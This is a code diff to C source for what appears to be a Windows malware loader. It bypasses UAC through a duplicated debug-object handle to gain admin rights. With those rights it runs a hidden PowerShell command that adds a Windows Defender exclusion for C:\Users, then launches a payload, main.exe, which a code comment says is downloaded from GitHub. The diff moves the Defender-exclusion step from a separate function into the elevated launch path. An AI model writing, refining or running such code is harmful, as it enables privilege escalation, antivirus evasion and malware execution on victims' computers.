@@ -75,24 +75,6 @@ BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LP
     return result;
 }
 
-BOOL AddDefenderExclusion() {
-    WCHAR cmdLine[512];
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    
-    wcscpy(cmdLine, L"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");
-    
-    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return TRUE;
-    }
-    return FALSE;
-}
-
 NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
     NTSTATUS status = (NTSTATUS)0xC0000001;
     SIZE_T size = 0;
@@ -132,6 +114,7 @@ int main() {
     DEBUG_EVENT dbgEvent;
     WCHAR szProcess[MAX_PATH * 2];
     WCHAR lpszPayload[MAX_PATH];
+    WCHAR psCmd[512];
 
     /* Download main.exe from GitHub to temp */
     GetTempPathW(MAX_PATH, lpszPayload);
@@ -174,12 +157,16 @@ int main() {
         if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && dbgProcessHandle) {
             nt = NtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
             if (nt == STATUS_SUCCESS) {
-                /* NOW WE HAVE ADMIN - Add Defender exclusion */
-                AddDefenderExclusion();
-                Sleep(1000);
+                /* STEP 1: Add Defender exclusion WITH ADMIN RIGHTS */
+                wcscpy(psCmd, g_ctx->szSystemDirectory);
+                wcscat(psCmd, L"\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");
                 
-                /* Launch main.exe with admin */
+                ucmxCreateProcessFromParent(dupHandle, psCmd);
+                Sleep(3000); // Give PowerShell time to execute
+                
+                /* STEP 2: Launch main.exe */
                 ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                
                 NtClose(dupHandle);
             }
             ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
